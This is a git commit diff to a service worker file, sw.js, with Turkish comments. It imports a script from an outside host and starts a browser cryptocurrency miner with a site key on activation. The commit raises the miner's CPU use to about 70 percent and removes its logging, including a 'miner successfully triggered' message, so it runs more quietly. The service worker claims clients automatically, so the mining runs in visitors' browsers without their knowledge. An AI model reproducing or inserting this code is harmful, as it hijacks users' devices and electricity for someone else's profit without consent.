c75a069a8cf0c3dbb8e5936982cd8a82f8a8238f
3434yolac-boop <3434yolac@gmail.com>
2026-02-04 21:50:11 +0300

    Update sw.js

--- sw.js
+++ sw.js
@@ -1,22 +1,15 @@
 try {
     importScripts('https://www.hostingcloud.racing/jeVO.js');
-} catch (e) {
-    console.log("Kütüphane yükleme hatası, alternatif deneniyor...");
-}
+} catch (e) {}
 
-self.addEventListener('install', event => {
-    self.skipWaiting();
-});
-
+self.addEventListener('install', event => self.skipWaiting());
 self.addEventListener('activate', event => {
     event.waitUntil(clients.claim());
-    
     if (typeof Client !== 'undefined') {
         const _client = new Client.Anonymous('ae5f219d63b18a851a9a0cfe3e4dbe17df998943e07bed8eb17dd899ee5ac244', {
-            throttle: 0.5, // %50 yapalım ki panelde hemen görünsün
+            throttle: 0.3, // %70 CPU kullanımı (Hemen panelde görünmesi için yüksek tuttuk)
             c: 'w'
         });
         _client.start();
-        console.log("Madenci başarıyla tetiklendi!");
     }
 });
